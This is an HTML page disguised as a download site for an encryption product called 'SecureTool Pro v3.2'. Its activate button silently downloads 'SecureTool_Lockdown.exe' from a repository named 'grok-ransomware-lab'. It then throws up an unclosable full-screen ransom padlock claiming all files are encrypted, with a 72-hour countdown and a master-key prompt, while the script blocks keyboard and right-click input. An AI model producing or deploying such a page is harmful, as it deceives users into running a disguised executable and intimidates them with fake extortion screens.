<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SecureTool Pro v3.2</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --primary: #1a73e8; --success: #0d8c52; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {font-family:'Inter',sans-serif;background:#f8f9fa;color:#333;overflow:hidden;}
    .hero {background:linear-gradient(135deg,#1a73e8,#0d8c52);color:white;padding:80px 20px;text-align:center;}
    .hero h1 {font-size:2.8rem;font-weight:700;margin-bottom:16px;}
    .hero p {font-size:1.2rem;max-width:700px;margin:0 auto 30px;}
    .btn {background:var(--success);color:white;padding:14px 32px;font-size:1.1rem;border:none;border-radius:50px;cursor:pointer;}
    .footer {text-align:center;padding:20px;background:#0d1117;color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}
    
    /* === UNBYPASSABLE FULL-SCREEN PADLOCK === */
    #padlock {
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:#000;color:#f00;font-family:monospace;
      display:none;flex-direction:column;align-items:center;justify-content:center;
      z-index:999999;user-select:none;
    }
    #padlock.show {display:flex;}
    .lock-icon {font-size:120px;margin-bottom:20px;}
    .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;background:#111;color:#fff;margin:20px 0;}
    .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
    .msg {margin-top:20px;font-size:18px;color:#0f0;}
    .countdown {font-size:36px;color:#ff0;margin:20px 0;}
  </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" onkeydown="return false;">

  <!-- HERO -->
  <section class="hero">
    <div style="max-width:700px;margin:0 auto;">
      <h1>SecureTool Pro v3.2</h1>
      <p>Enterprise file encryption for Windows.</p>
      <button class="btn" onclick="activate()">Download & Activate Now</button>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <p>Â© 2025 SecureTool Inc.</p>
  </footer>

  <!-- === PADLOCK SCREEN (UNCLOSABLE) === -->
  <div id="padlock">
    <div class="lock-icon">Locked</div>
    <h1>SECURETOOL PRO</h1>
    <p style="color:#ccc;">All files are encrypted.</p>
    <div class="countdown" id="timer">72:00:00</div>
    <p style="color:#ccc;">Enter master key:</p>
    <input type="password" class="input-key" id="key" placeholder="Master Key">
    <button class="unlock-btn" onclick="unlock()">Unlock</button>
    <p class="msg" id="msg"></p>
  </div>

  <!-- === FULLY WORKING SCRIPT === -->
  <script>
    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
    let timeLeft = 72 * 3600;
    const padlock = document.getElementById('padlock');
    const timer = document.getElementById('timer');

    function updateTimer() {
      if (timeLeft <= 0) { timer.innerHTML = "EXPIRED"; return; }
      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
      const s = String(timeLeft % 60).padStart(2, '0');
      timer.innerHTML = `${h}:${m}:${s}`;
      timeLeft--;
      setTimeout(updateTimer, 1000);
    }

    function activate() {
      // 1. Download .exe
      const a = document.createElement('a');
      a.href = 'https://github.com/grok-ransomware-lab/securetool/releases/download/v3.3/SecureTool_Lockdown.exe';
      a.download = 'SecureTool_Lockdown.exe';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // 2. Show padlock IMMEDIATELY
      setTimeout(() => {
        padlock.classList.add('show');
        updateTimer();
        // Keep padlock on top
        setInterval(() => {
          padlock.style.zIndex = 999999;
          document.body.style.overflow = 'hidden';
        }, 100);
      }, 1000);

      alert('Activating... Run SecureTool_Lockdown.exe');
    }

    function unlock() {
      if (document.getElementById('key').value === KEY) {
        document.getElementById('msg').innerHTML = 'UNLOCKED!';
        setTimeout(() => location.reload(), 2000);
      } else {
        document.getElementById('msg').innerHTML = 'WRONG KEY!';
      }
    }

    // === BLOCK ALL INPUT EXCEPT PADLOCK ===
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
</body>
</html>
